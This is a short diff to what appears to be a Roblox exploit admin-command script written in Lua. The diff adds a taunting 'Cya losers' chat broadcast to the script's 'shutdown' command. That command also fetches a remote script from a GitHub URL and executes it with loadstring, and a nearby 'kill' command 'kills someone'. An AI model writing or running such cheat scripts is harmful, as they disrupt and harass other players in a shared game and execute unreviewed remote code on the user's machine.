@@ -2756,7 +2756,12 @@ AddCommand("kill", {"tkill"}, "kills someone", {"1", 1, 3}, function(Caller, Arg
 end)
 
 AddCommand("shutdown", {}, "exits the game", {1, "1"}, function(Caller, Args)
+local args = {
+    [1] = "Cya losers",
+    [2] = "All"
+}
 
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
 loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/Mestalic/SptsScripts/main/Shutdown"))();
 
 end)
